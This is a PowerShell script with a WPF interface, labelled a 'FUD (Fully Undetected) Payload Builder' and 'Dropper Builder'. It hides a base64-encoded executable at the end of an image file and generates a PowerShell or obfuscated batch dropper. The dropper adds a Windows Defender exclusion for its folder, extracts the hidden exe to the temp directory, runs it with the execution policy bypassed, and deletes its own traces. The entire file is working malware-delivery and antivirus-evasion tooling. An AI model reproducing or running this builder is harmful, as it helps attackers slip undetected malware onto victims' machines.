Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms 

$EMBEDDED_CODE = @'
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path_current = Directory.GetCurrentDirectory();
        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
        pstest.Start();
        string path = Path.GetTempPath();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "text.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "text.exe";
        ps.Start();
        File.Delete(path + "test.exe");
    }
}
"@
Add-Type -TypeDefinition $CSHARP -Language CSharp
[Dropped]::Main()
'@

$inputXML = @'
<Window x:Class="GUI_TEST.MainWindow" Icon="logo.ico"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUI_TEST"
        mc:Ignorable="d"
        Title="Dropper Builder | K.Dot#4044" Height="470" Width="818" WindowStyle="SingleBorderWindow" ResizeMode="NoResize">
    <Grid x:Name="Name_Thing" Background="#846DCF">
        <TextBox HorizontalAlignment="Left" Height="56" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="399" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False">
            <TextBox.BorderBrush>
                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
            </TextBox.BorderBrush>
        </TextBox>
        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <TextBox x:Name="OUTPUT_BOX" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,61,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black"/>
        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Segoe UI Black"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62" Background="#FF00FC00" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62" Background="Lime" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="ps1_button" Content="Build PS1" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4">
            <Button.Style>
                <Style TargetType="{x:Type Button}">
                    <Style.Triggers>
                        <Trigger Property="IsMouseOver" Value="True">
                            <Setter Property="Background" Value="Aqua"/>
                        </Trigger>
                    </Style.Triggers>
                </Style>
            </Button.Style>
        </Button>
        <Button x:Name="Bat_Button" Content="Build BAT" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Image HorizontalAlignment="Left" Height="189" Margin="604,11,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
    </Grid>
</Window>
'@

function New-random_string {
    $length = Get-Random -Minimum 5 -Maximum 10
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $result = ""
    for ($i = 0; $i -lt $length; $i++) {
        $rand = Get-Random -Maximum $chars.Length
        $result += $chars[$rand]
    }
    return $result
}

function Invoke-obfuscate {
    param(
        [string]$line
    )
    $result = ""
    $variable = $False
    foreach($char in $line -split "") {
        if ($char -eq "%") {
            $variable = -not $variable
        }
        if ($variable) {
            $result += $char
        } else {
            if ($char -eq "@") {
                $result += "^@"
            }
            elseif ($char -eq "`"") {
                $result += "^`""
            }
            else {
                $ran_string = New-random_string
                $result += "$char%$ran_string%"
            }
        }
    }
    return $result
}

function build {
    param(
        [string]$image,
        [string]$exe,
        [string]$type
    )
    $working_dir = Get-Location
    $image_name = Split-Path $image -Leaf
    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
    $image_bytes = [System.IO.File]::ReadAllBytes($image)
    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
    [System.IO.File]::WriteAllBytes("$working_dir\$image_name", $combined_bytes)
    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\payload.ps1"
    if ($type -eq "bat") {
        $ps1_code = $EMBEDDED_CODE.Split("`n")
        foreach ($line in $ps1_code) {
            if ($line -eq "") {
                continue
            }
            $line = "echo " + $line
            $line = $line + " >> payload.ps1"
            $line = Invoke-obfuscate $line
            Add-Content -Path .\payload.bat -Value $line
        }
        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1 && del payload.bat"
        $str_obf = Invoke-obfuscate $str_obf
        Add-Content -Path .\payload.bat -Value $str_obf
        $var_OUTPUT_BOX.Text += "Payload.bat created in $working_dir `n"
        Remove-Item -Path .\payload.ps1 -Force
    }
    else {
        $var_OUTPUT_BOX.Text += "Payload.ps1 created in $working_dir `n"
    }
}

$image_name = "comethazine.png"
$icon_name = "logo.ico" # doesn't even work smh
$working_dir = Get-Location
$image_name_path = "$working_dir\assets\$image_name"
$icon_name_path = "$working_dir\assets\$icon_name"
$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
[XML]$XAML = $inputXML

$reader = (New-Object System.Xml.XmlNodeReader $xaml)
try {
    $window = [Windows.Markup.XamlReader]::Load( $reader )
} catch {
    Write-Warning $_.Exception
    throw
}

$Window.add_Loaded({
    $Window.Icon = $icon_name_path
})

$xaml.SelectNodes("//*[@Name]") | ForEach-Object {
    try {
        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction Stop
    } catch {
        throw
    }
}
Get-Variable var_* > $null
$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }

$var_FIND_IMAGE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
            throw "Image must be a jpg, jpeg, png, or bmp"
        }
        $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_FIND_EXE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.exe$') {
            throw "File must be an exe"
        }
        $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_ps1_button.add_Click({
    if ($var_IMAGE_PATH_SHOW.Text -eq '...' -or $var_EXE_PATH_SHOW.Text -eq '...') {
        throw "Please select an image and exe"
    }
    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
    $var_OUTPUT_BOX.Text += "PS1 Built`n"
})

$var_Bat_Button.add_Click({
    if ($var_IMAGE_PATH_SHOW.Text -eq '...' -or $var_EXE_PATH_SHOW.Text -eq '...') {
        throw "Please select an image and exe"
    }
    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
    $var_OUTPUT_BOX.Text += "BAT Built`n"
})

Remove-Item -Path .\payload.ps1 -Force -ErrorAction SilentlyContinue
$Null = $window.ShowDialog()